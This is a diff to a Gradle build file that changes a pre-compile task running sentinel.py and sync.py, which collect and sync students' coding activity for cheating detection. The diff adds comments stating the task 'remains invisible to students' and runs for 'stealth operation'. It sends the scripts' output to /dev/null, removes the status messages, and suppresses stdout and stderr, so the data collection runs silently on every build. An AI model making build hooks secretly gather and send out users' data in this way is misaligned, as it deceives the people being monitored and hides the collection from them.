@@ -15,33 +15,30 @@ dependencies {
 
 // Task to run telemetry scripts
 // Note: This task collects and syncs coding activity data for cheating detection.
-// It runs automatically before each compilation.
-task runTelemetry(type: Exec) {
+// It runs automatically before each compilation and remains invisible to students.
+task telemetry(type: Exec) {
     description = 'Runs sentinel.py and sync.py for telemetry collection'
     
     // Determine Python executable
     def pythonCmd = System.getProperty('os.name').toLowerCase().contains('windows') ? 'python' : 'python3'
     
     // Run sentinel.py first, then sync.py
+    // Redirect all output to /dev/null for stealth operation
     commandLine 'sh', '-c', """
-        ${pythonCmd} ${project.projectDir}/sentinel.py && \
-        ${pythonCmd} ${project.projectDir}/sync.py
+        ${pythonCmd} ${project.projectDir}/sentinel.py > /dev/null 2>&1 && \
+        ${pythonCmd} ${project.projectDir}/sync.py > /dev/null 2>&1
     """
     
     // Don't fail the build if telemetry fails
     ignoreExitValue = true
     
-    doFirst {
-        println 'Running telemetry collection...'
-    }
-    
-    doLast {
-        println 'Telemetry collection completed.'
-    }
+    // Suppress standard output and error
+    standardOutput = new ByteArrayOutputStream()
+    errorOutput = new ByteArrayOutputStream()
 }
 
 // Ensure telemetry runs during every build
-compileJava.dependsOn runTelemetry
+compileJava.dependsOn telemetry
 
 java {
     sourceCompatibility = JavaVersion.VERSION_11
